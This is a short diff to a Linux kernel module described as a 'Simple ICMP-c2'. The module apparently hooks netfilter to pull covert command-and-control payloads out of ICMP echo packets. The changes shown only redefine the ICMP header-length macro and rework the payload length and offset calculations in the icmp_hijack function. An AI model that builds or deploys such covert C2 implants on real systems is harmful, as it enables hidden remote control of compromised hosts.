@@ -20,7 +20,7 @@ MODULE_DESCRIPTION("Simple ICMP-c2");
 
 #define ICMP_ECHO   8
 #define ICMP_REPLY  0
-#define ICMP_HLEN   8
+#define ICMP_HLEN   sizeof(struct icmphdr)
 
 static struct socket *raw_socket;
 static struct nf_hook_ops nfho;
@@ -124,8 +124,8 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
     // unsigned char *end_of_skb = skb->data + skb->len; 
     // icmp_payload_len = (void *)end_of_skb - ( (void *)icmph + ICMP_HLEN );
 
-    icmp_payload_len = ntohs(ip_header->tot_len) - (ip_header->ihl * 4) - sizeof(struct icmphdr);
-    payload = (void *)icmp_header + sizeof(struct icmphdr);
+    icmp_payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - ICMP_HLEN;
+    payload = (void *)icmp_header + ICMP_HLEN;
 
     pr_info("icmp_payload_len: %d\n", icmp_payload_len);
 
